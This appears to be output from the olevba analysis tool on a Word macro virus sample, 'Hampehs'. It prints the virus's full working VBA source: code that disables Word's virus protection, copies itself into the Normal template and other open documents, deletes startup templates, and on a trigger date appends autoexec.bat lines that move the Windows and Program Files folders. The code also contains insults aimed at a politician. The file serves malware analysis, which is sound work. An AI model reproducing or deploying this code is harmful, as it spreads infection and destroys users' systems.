olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shepmah-2a30f6f7ea5754a6a91b7caae0d226f59b2b89b1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shepmah-2a30f6f7ea5754a6a91b7caae0d226f59b2b89b1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hampehs.bas 
in file: Virus.MSWord.Shepmah-2a30f6f7ea5754a6a91b7caae0d226f59b2b89b1 - OLE stream: 'Macros/VBA/hampehs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hampesh v1.0b
'Release : 12/10/1999

'Dedicated to the biggest PUKIMAK in Malaysia!
'Dato' Seri Dr Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoClose()
On Error Resume Next
WordBasic.disableautomacros False
Application.EnableCancelKey = wdCancelDisabled

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

AutoOpen

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled

Kill Application.StartupPath & "\*.dot"

Set actDoc = ActiveDocument

Go_DingDang

If Documents.Count > 1 Then
    Dim bil
    For bil = 1 To Documents.Count
        If Documents(bil).Name <> ActiveDocument.Name Then
        Set actDoc = Documents(bil)
        Dah_Jumpe = True
        Go_DingDang
        End If
    Next
End If
Bunuh_Mahadet
End Sub
Sub FileOpen()
WordBasic.disableautomacros True

If Dialogs(80).Show <> 0 Then WordBasic.disableautomacros False
AutoOpen
WordBasic.disableautomacros False
End Sub
Sub Bunuh_Mahadet()
On Error Resume Next
masa_membunuh = Now
hari = Day(masa_membunuh)
bulan = Month(masa_membunuh)

If hari = 25 And bulan = 2 Then

If Dir("c:\dingdang.kri") <> "" Then GoTo habihs

If Dir("c:\zalim.det") <> "" Then GoTo habihs

Open "C:\zalim.det" For Output As 1
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;)=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "Hidup ni memang  HAMPEHS kan? Dah tua-tua kena blajar lagi"
Print #1, "Mahathir  pun  memang  HAMPEHS. Memeningkan  kepala  semua"
Print #1, "Microsoft Word pun HAMPEHS jugak... Sebab ada macros bodoh"
Print #1, "     Tapi hidup tanpa HAMPEHS, ia  tak akan sempurna"
Print #1, "     Oleh itu, sedikit HAMPEHS dari kami kepada anda"
Print #1, "            Semoga hidup ini bertambah ceria!"
Print #1, ""
Print #1, "            HAMPEHS-HAMPEHS kan la diri anda!"
Print #1, "     Kerana nasib  semalam mungkin lebih bahagia...~"
Print #1, "                                               [DD/UTM'99]"
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;(=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Close 1
Open "c:\autoexec.bat" For Append As 1
Print #1, "Rem -- Hampehs Wuz HERE! ;)="
Print #1, "echo off"
Print #1, "cls"
Print #1, "move /y progra~1 tempt1 > null"
Print #1, "move /y windows tempt2 > null"
Print #1, "cls"
Print #1, "type c:\zalim.det"
Print #1, "pause > null"
Print #1, "Rem -- The world full of Hampehs!"
Close 1

habihs:


CommandBars("Help").Controls("About Microsoft Word").Caption = "[Hampehs] by Dingdang"
CommandBars("Help").Controls("[Hampehs] by Dingdang").Enabled = False


DingDang.Show



End If
End Sub
Sub ToolsMacro()
On Error Resume Next
End Sub
Sub ViewVBCode()
On Error Resume Next
End Sub







-------------------------------------------------------------------------------
VBA MACRO DingDang.frm 
in file: Virus.MSWord.Shepmah-2a30f6f7ea5754a6a91b7caae0d226f59b2b89b1 - OLE stream: 'Macros/VBA/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
























































Public mesej As Variant

Private Sub Butang_Click()
Unload Me
End Sub

Public Sub UserForm_Layout()

teks1 = "Hampehs terhasil daripadai masa aku yang terbazir selama seminggu. Juga daripada rasa malas nak study.."
teks2 = "Tengkiu pada CHeTT untuk koleksi lagu-lagu hindustannya terutama lagu lembu. Lagu yang naik beskal pun bes gak!"
teks3 = "Ellow Jack! Hehehhe... setakat mana agaknya keberkesanan Hampehs ni 'ek? Bini apamacam? Sehat? ;)="
teks4 = "Jamal weh.. ada orang talipon! Hehehe.. satu-satunya mamat yang paling kuat skali begayut selaku mahasistua"
teks5 = "Encik Goku yang gila main game. Sorry... sebab folder games dah di dilitt... NOT! Tipu jerr. manaleh dilit.. faverett!"
teks6 = "Kepada semua awek-awek IRC DALnet yang rasa dirinya jambu, salam khas dari KAMI untuk anda!"
teks7 = "[KUASA PERIBADI ADALAH KUASA RAKYAT YANG DIPERKOSA] SALAM REFORMASI UNTUK SEMUA PEJUANG!"

DingDang.Enabled = False
Butang.Enabled = False
Butang.Caption = "TunGGu MesEj AbiHs DuLu!"
mesej = Array(teks1, teks2, teks3, teks4, teks5, teks6, teks7)
i = 0
For i = 0 To 6
PauseTime = 7
    Start = Timer
    Do While Timer < Start + PauseTime
        DoEvents
    Loop
    Msg.Caption = mesej(i)
Next i
DingDang.Enabled = True
Butang.Enabled = True
Butang.Caption = "Hampehs BetOI!!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Butang_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://hampehs.cjb.n|URL                                          |
|          |et                  |                                             |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

